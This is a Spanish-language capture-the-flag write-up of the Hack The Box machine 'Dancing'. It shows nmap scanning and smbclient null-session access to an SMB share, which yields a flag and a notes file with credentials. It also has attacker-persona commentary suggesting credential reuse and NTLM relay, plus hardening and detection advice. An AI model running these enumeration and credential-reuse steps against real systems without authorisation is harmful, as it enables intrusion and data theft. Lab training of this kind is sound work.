Explotación de una configuración SMB insegura que permite null session (conexión sin credenciales) en un sistema Windows. Resumen Ejecutivo

La máquina Dancing es un sistema Windows que expone SMB (Server Message Block) en los puertos 139 y 445. La configuración permite null session — conexión sin credenciales — que nos permite listar los recursos compartidos (shares) disponibles. El share WorkShares contiene carpetas de usuarios donde encontramos flag.txt en el directorio de James.P. Bonus: encontramos worknotes.txt en el directorio de Amy.J con información interna de la infraestructura.

¿Qué es SMB y por qué es tan atacado?

SMB (Server Message Block) es el protocolo de "carpetas compartidas" de Windows. Creado por IBM en 1983, es el estándar para compartir archivos, impresoras y recursos en redes Windows. Puerto 139 (SMB sobre NetBIOS, método antiguo) y puerto 445 (SMB directo sobre TCP, método moderno).

⚠ Una null session es una conexión SMB sin usuario ni contraseña

Cuando está habilitada, un atacante puede listar todos los shares disponibles y, si los permisos son incorrectos, leer su contenido completo — sin ninguna credencial. Históricamente Windows lo permitía por compatibilidad con sistemas legacy.

Reconocimiento — Paso a Paso

Paso 1 — Reconocimiento

ping — Detectar Windows por TTL

¿Por qué este comando?

Confirmar conectividad e identificar el OS. TTL=127 delata Windows — Windows usa TTL inicial de 128 (Linux usa 64). Con 1 salto de red llega como 127. Esto cambia completamente la estrategia: Windows → pensar en SMB, RDP, WinRM.

ping -c2 10.129.1.12
ping → herramienta ICMP de diagnóstico de red
-c2 → enviar 2 paquetes y detenerse
10.129.1.12 → IP del objetivo en HTB VPN
Output
64 bytes from 10.129.1.12: icmp_seq=1 ttl=127 time=52.3 ms
64 bytes from 10.129.1.12: icmp_seq=2 ttl=127 time=51.8 ms
¿Qué nos dice este output?
  • ttl=127 → Windows confirmado. TTL inicial 128, menos 1 salto = 127.
  • Esto nos dice: preparar herramientas Windows — smbclient, enum4linux, evil-winrm.
Decisión tomada

Windows confirmado. Procedemos a descubrir puertos — esperamos SMB (139/445), RDP (3389), WinRM (5985).

Paso 2 — Reconocimiento

Nmap fase rápida — Descubrir todos los puertos

¿Por qué escaneamos todos los puertos?

Windows por diseño tiene muchos servicios corriendo: RPC, NetBIOS, SMB, WinRM. Necesitamos verlos todos para entender la superficie de ataque completa.

nmap -p- --open -n -T4 -sS 10.129.1.12
-p- → todos los 65535 puertos TCP
--open → solo puertos abiertos
-n → sin resolución DNS (más rápido)
-T4 → velocidad agresiva
-sS → SYN scan half-open (no completa el handshake)
Output
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
¿Qué significa cada puerto?
  • 135/tcp msrpc → Microsoft RPC — comunicación interna entre procesos Windows
  • 139/tcp netbios-ssn → SMB antiguo sobre NetBIOS
  • 445/tcp microsoft-ds → SMB moderno directo — nuestro objetivo principal
  • 5985/tcp wsman y 47001/tcp winrm → WinRM — administración remota por PowerShell. Si conseguimos credenciales, podemos usar evil-winrm para una shell completa.
  • 49664-49669 → puertos RPC dinámicos asignados aleatoriamente por Windows
Decisión tomada

Puerto 445 (SMB) = vector principal. WinRM en 5985 = vector secundario si conseguimos credenciales. Fase profunda enfocada en SMB.

Paso 3 — Reconocimiento

Nmap fase profunda — Scripts SMB y detección de vulnerabilidades

¿Por qué es crítica esta fase para SMB?

Los scripts NSE para SMB revelan información crucial: versión de Windows, si SMB signing está habilitado (crítico para seguridad), y si null session está disponible. Esta información define toda la estrategia.

nmap -p135,139,445,5985 -sC -sV -n 10.129.1.12
-p135,139,445,5985 → solo los puertos relevantes (no repetir los 65535)
-sC → scripts NSE para SMB: smb-security-mode (detecta signing), smb2-security-mode, smb-os-discovery (versión Windows exacta)
-sV → versiones exactas de los servicios
-n → sin DNS
Output
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required

| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|_  message_signing: disabled (dangerous, but default)

OS: Windows 10 / Server 2016 / 2019
¿Qué nos dice cada línea?
  • account_used: guest → Nmap accedió con cuenta Guest (sin contraseña) — null session confirmada
  • message_signing: disabled (dangerous, but default) → ALERTA: SMB Signing deshabilitado → vulnerable a NTLM Relay
  • Windows 10 / Server 2016 → versión del OS para buscar CVEs específicos si el método simple falla
Decisión tomada

Null session confirmada. SMB Signing deshabilitado (bonus: vulnerable a NTLM Relay). Procedemos a enumerar shares disponibles.

⚠
SMB Signing: DISABLED — Vulnerable a NTLM Relay

Sin firma digital en mensajes SMB, un atacante puede usar Responder para capturar hashes NTLM y reenviarlos a otros servidores con ntlmrelayx. En redes reales con múltiples hosts Windows, esta vulnerabilidad es devastadora.

Enumeración y Explotación SMB

Paso 4 — Enumeración

Listar shares disponibles con null session

¿Qué es smbclient y por qué -N?

smbclient es el cliente SMB para Linux (parte del suite Samba). Funciona similar a un cliente FTP pero habla el protocolo SMB. El flag -N indica "no pedir contraseña" — intenta null session automáticamente.

smbclient -L //10.129.1.12 -N
smbclient → cliente SMB para Linux — similar a cliente FTP pero para protocolo SMB
-L //10.129.1.12 → (List) listar todos los shares disponibles en el servidor 10.129.1.12
-N → (No password) intentar null session sin contraseña
Output
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
¿Qué significa cada share?
ShareDescripciónAccesibilidad
ADMIN$C:\Windows — administración remotaSolo admins
C$Disco C: completoSolo admins
IPC$Comunicación entre procesosLimitada
WorkSharesShare personalizado — nombre no estándar¡ACCESIBLE!
Decisión tomada

WorkShares es el objetivo: es un share CUSTOM creado por el admin, frecuentemente con permisos más laxos. Intentamos acceder sin credenciales.

Paso 5 — Explotación

Acceder a WorkShares y explorar directorios

smbclient //10.129.1.12/WorkShares -N
//10.129.1.12/WorkShares → conectar al share específico "WorkShares" en la IP dada
-N → null session, sin contraseña — si el share está mal configurado, entramos
Sesión SMB completa
smb: \> ls
  .                                   D        0  Mon Mar 29 09:22:01 2021
  ..                                  D        0  Mon Mar 29 09:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 09:38:03 2021

smb: \> cd Amy.J
smb: \Amy.J\> ls
  worknotes.txt                       A      106  Mon Mar 29 09:09:28 2021
smb: \Amy.J\> get worknotes.txt

smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 09:26:57 2021
smb: \James.P\> get flag.txt
smb: \James.P\> exit
¿Qué hace cada comando dentro de smbclient?
  • ls → listar contenido del directorio actual en el share SMB
  • cd Amy.J / cd James.P → navegar a subdirectorios (igual que en Linux/Windows)
  • get worknotes.txt / get flag.txt → descargar archivos al directorio local de Kali
  • exit → cerrar la sesión SMB limpiamente

Regla: Siempre explorar TODOS los directorios, no solo el primero. Amy.J tenía worknotes.txt con información valiosa.

Panel de Agentes

⚔ RTO — Red Team

Vector: SMB null session → WorkShares. Vector secundario: WinRM en 5985 con credenciales de worknotes.txt (FTP-user:0). Pivoting potencial a servidor Apache Linux.

🛡 BTA — Blue Team

Nivel de ruido: BAJO. smbclient -L genera 1 evento. Sin IDS básico, pasa desapercibido. Alternativa más silenciosa: smbmap genera menos eventos que la sesión interactiva.

🎭 BHM — Black Hat

worknotes.txt reveló credenciales. En red real: FTP-user:0 en todos los servicios. El Apache Linux puede tener panel admin o upload. Siempre explorar Amy.J antes de James.P.

Lecciones Aprendidas

⚔ Para el Atacante

  • TTL=127 → Windows → preparar herramientas SMB
  • Shares custom (WorkShares, Public, Temp) → siempre intentar acceso
  • Explorar TODOS los directorios de usuarios — no solo el primero
  • SMB Signing disabled → anotar para NTLM Relay
  • Archivos en shares compartidos frecuentemente contienen credenciales

🛡 Para el Defensor

  • Deshabilitar null sessions: RestrictAnonymous=2
  • Habilitar SMB Signing: RequireSecuritySignature=$true
  • Revisar permisos de shares: solo usuarios necesarios
  • No almacenar datos sensibles en shares compartidos
  • Detectar: Event ID 4624 (login) + 5140 (acceso a share)
